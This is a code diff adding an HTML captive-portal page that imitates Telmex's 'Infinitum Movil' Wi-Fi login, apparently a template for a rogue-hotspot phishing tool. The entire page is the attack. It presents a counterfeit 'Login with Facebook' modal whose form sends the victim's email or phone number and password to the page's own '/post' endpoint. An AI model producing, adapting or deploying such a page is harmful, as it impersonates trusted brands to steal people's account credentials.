@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!--<meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Infinitum Movil</title>
+  <link rel="stylesheet" href="/static/css/infinitum.css">
+  <link href="/static/logos/favicon.ico" rel="Shortcut Icon">
+</head>
+<body>
+
+  <header>
+    <img src="/static/logos/telmex.png" id="telmex" alt="">
+    <img src="/static/logos/wifi_movil_infinitum_logo.jpg" id="infi" alt="">
+  </header>
+
+  <div id="imgBG">
+    <img src="/static/logos/TMX.jpg">
+  </div>
+
+  <div id="loginContainer">
+    <p> Inicia sesión con tu cuenta para acceder a internet </p>
+    <div id="fbButton">
+      <img src="/static/logos/facebook-logo.png" alt="">
+      <span> Login with Facebook</span>
+    </div>
+  </div>
+
+  <div id="facebookModalContainer">
+    <div id="facebookModal">
+      <div class="close">
+        <span>
+          x
+        </span>
+      </div>
+      <div id="fbModalHeader">
+        <img src="/static/logos/facebook-logo.png" alt="">
+        <span>Facebook</span>
+      </div>
+      <div class="container">
+        <p>Log in to use your Facebook account with  <b>Infinitum Movil</b> </p>
+        <form name="theform" method="post" action="/post" onsubmit="return validateForm();">
+          <div class="loginForm">
+            <div class="row">
+              <label for="wfphshr-email">Email or Phone: </label>
+              <input type="text" class="inputtext" name="wfphshr-email" id="email" tabindex="1" value="" autofocus="1">
+            </div>
+            <div class="row">
+              <label for="wfphshr-password">Password: </label>
+              <input type="password" class="inputtext" name="wfphshr-password" id="pass" tabindex="1">
+            </div>
+
+            <div class="buttons" >
+              <label class="login_form_label"></label>
+              <label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_2">
+                <input value="Log In" name="login" tabindex="1" type="submit" id="submit">
+              </label>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+<script src="/static/js/jquery.min.js"></script>
+<script src="/static/js/infinitum.js"></script>
+
+</body>
+</html>
